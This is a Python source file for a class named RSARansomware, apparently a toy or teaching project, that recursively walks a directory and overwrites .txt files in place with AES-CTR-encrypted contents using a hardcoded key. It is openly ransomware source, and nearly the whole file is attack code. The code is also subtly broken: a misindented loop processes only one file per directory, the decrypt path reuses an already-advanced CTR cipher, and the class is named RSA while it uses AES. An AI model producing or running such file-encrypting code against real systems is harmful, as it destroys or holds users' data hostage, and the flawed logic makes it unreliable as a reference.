import os
from os.path import expanduser
from Crypto.Cipher import AES
import base64


class RSARansomware:

    def __init__(self, key=None):
        self.key = key
        self.cipher = None
        self.file_extension_targets = ['txt']

    def generate_aes_key(self):
        # Generates an AES-128 key and creates a cipher object

        self.key = b'Sixteen byte key'
        self.cipher = AES.new(self.key, AES.MODE_CTR)

    def read_aes_key(self, key_file_name):
        # Reads a key from a file
        # key_file_name refers to a path to the file containg the key

        with open(key_file_name, 'rb') as key_file:
            self.key = key_file.read()
            self.cipher = AES.new(self.key, AES.MODE_CTR)

    def write_aes_key(self, key_file_name):
        # Prints the key and writes key to a key file

        print(self.key)
        with open(key_file_name, 'wb') as key_file:
            key_file.write(self.key)

    def crypt_root(self, root_directory, encrypted=False):
        # Utilizes recursion to encrypt or decrypt files from root directory with allowed file extensions
        # root_directory refers to the absolute path of the top level directory
        # encrypt is a boolean that specifies whether to encrypt or decrypt encountered files

        for root, _, files in os.walk(root_directory):
            for a_file in files:
                absolute_file_path = os.path.join(root, a_file)
            if not absolute_file_path.split('.')[-1] in self.file_extension_targets:
                continue
            # if not a file extension target, it will pass and seek another file to crypt

            self.crypt_file(absolute_file_path, encrypted=encrypted)

    def crypt_file(self, file_path, encrypted=False):
        # Encrypts or decrypts a file
        # file_path refers to the absolute path to a file
        # encrypted boolean specifies if function should notify user about the file contents post encryption or post decryption

        with open(file_path, 'rb+') as a_file:
            file_data = a_file.read()
            if not encrypted:
                print(f'FILE CONTENTS PRE-ENCRYPTION: {file_data}')
                data = self.cipher.encrypt(file_data)
                print(f'FILE CONTENTS POST-ENCRYPTION: {data}')
            else:
                data = self.cipher.decrypt(file_data)
                print(f'FILE CONTENTS POST-ENCRYPTION: {data}')
            a_file.seek(0)
            a_file.write(data)
